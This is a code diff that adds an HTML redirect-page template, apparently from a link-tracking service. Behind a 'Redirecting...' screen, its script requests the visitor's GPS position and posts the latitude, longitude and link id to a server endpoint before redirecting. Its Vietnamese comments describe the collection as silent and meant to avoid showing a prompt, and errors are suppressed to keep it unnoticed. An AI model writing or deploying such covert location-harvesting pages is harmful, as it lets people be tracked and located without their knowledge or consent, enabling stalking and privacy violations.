@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        .loading { color: #666; }
+    </style>
+</head>
+<body>
+    <div class="loading">
+        <h3>Redirecting...</h3>
+        <p>Please wait...</p>
+    </div>
+
+    <script>
+        // Thu thập thông tin bổ sung một cách âm thầm
+        const linkId = '<%= link.link_id %>';
+        const targetUrl = '<%= link.original_url %>';
+        
+        // Hàm gửi location update âm thầm
+        function updateLocationSilently(lat, lng) {
+            fetch('/api/update-location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    linkId: linkId,
+                    latitude: lat,
+                    longitude: lng
+                })
+            }).catch(() => {}); // Bỏ qua lỗi
+        }
+        
+        // Lấy vị trí GPS nếu có thể (không hiển thị prompt)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    updateLocationSilently(
+                        position.coords.latitude, 
+                        position.coords.longitude
+                    );
+                },
+                () => {}, // Bỏ qua lỗi
+                { 
+                    timeout: 3000,
+                    enableHighAccuracy: false,
+                    maximumAge: 300000
+                }
+            );
+        }
+        
+        // Redirect ngay lập tức
+        setTimeout(() => {
+            window.location.href = targetUrl;
+        }, 100);
+    </script>
+</body>
+</html>
